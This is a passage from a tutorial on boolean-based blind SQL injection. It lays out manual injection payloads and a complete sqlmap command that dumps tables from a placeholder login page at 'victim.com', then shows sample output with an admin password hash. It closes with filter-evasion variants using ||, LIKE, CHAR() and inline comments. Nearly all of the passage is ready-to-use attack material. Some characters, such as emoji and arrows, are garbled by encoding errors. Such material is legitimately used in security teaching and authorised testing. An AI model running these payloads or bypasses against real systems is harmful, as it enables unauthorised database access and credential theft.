2Ô∏è‚É£ Manual Boolean-based Blind Payload

Manually, you‚Äôd test with:

' OR SUBSTRING(username,1,1)='a'--


If the response is different when the condition is true, you can infer that the first letter is a.

3Ô∏è‚É£ Automating with sqlmap

Instead of guessing letter by letter, sqlmap will do this automatically.

Example sqlmap Command:
sqlmap -u "http://victim.com/login.php" \
--data="username=admin&password=pass" \
-p username \
--dbms=mysql \
--technique=B \
--dump

üîé Explanation of options:

-u ‚Üí Target URL.

--data ‚Üí POST data being sent (as if filling in login form).

-p username ‚Üí Tells sqlmap to test only the username parameter for injection.

--dbms=mysql ‚Üí (optional) Speeds things up if you know the backend DB.

--technique=B ‚Üí Only test Boolean-based blind injection.

--dump ‚Üí Extract data (tables + rows).

4Ô∏è‚É£ What Happens Internally

sqlmap injects conditions like:

' OR SUBSTRING(username,1,1)='a'--
' OR SUBSTRING(username,1,1)='b'--


It observes the true/false difference (page load, error, redirect, etc.).

It loops through characters (a ‚Üí z, 0 ‚Üí 9, symbols, etc.).

It reconstructs the entire username automatically.

5Ô∏è‚É£ Example Output

When it succeeds, sqlmap might show:

Database: appdb
Table: users
[1 entry]
+----+----------+----------+
| id | username | password |
+----+----------+----------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
+----+----------+----------+


Here 5f4dcc3b5aa765d61d8327deb882cf99 is the MD5 hash of "password".

----------------------------------------------------------------------------------------------------------------

Boolean-Based Blind SQLi

Normal Payload:

' OR SUBSTRING(username,1,1)='a'--


Bypass Tricks:

Replace OR with its symbolic operator ||:

' || SUBSTRING(username,1,1)='a'--


Replace = with LIKE:

' OR SUBSTRING(username,1,1) LIKE 'a'--


Replace 'a' with ASCII CHAR():

' OR SUBSTRING(username,1,1)=CHAR(97)--


Inline comments:

' OR SUBSTRING(username,1,1)/**/='a'--
